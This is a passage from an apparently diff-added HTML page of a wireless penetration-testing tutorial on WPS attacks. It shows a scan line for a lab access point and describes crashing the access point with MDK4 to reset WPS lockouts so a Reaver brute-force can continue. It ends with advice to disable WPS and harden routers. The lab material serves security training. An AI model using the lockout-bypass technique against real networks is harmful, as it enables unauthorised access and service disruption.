+ 60:38:E0:XX:XX:XX  -52  <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 14 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span> <span class="hljs-number"> 65 </span>  WPA2 CCMP   PSK Label  HTB-Wireless
+</code></pre>
+<p>If all goes well, and our access point is reset, our Reaver session in the first terminal should be able to continue. This whole process could be scripted to take away from the need to manually crash the access point every time a lock is incurred. The general idea stays the same. Although this method is proven to cause resets among access points, it creates a noticeable amount of undesired detection for a penetration tester. If we need to keep a low profile, these Denial-of-Service methods would not be a good way to go.</p>
+<p> Crashing a target access point (AP) with MDK4 is a method that only works on very old routers. Recent routers are not vulnerable to this type of Denial-of-Service (DoS) attack.</p>
+<hr>
+<h3 id="closing-thoughts">Closing Thoughts</h3>
+<p>The importance of securing WPS devices cannot be overstated. As technology continues to evolve, so do the methods and tools used by cybercriminals to exploit vulnerabilities. WPS, being an older protocol, is particularly susceptible to attacks and should be disabled to enhance security. By understanding the risks associated with WPS and implementing robust security measures, such as using strong passwords, regularly updating firmware, and employing advanced encryption methods, we can significantly reduce the likelihood of unauthorized access and protect our wireless networks. Whether you're a seasoned cybersecurity professional or just beginning your journey, staying informed and vigilant is key to safeguarding your digital environment. Remember, a proactive approach to security is always more effective than a reactive one.</p>
+<hr>
+</div></body></html>
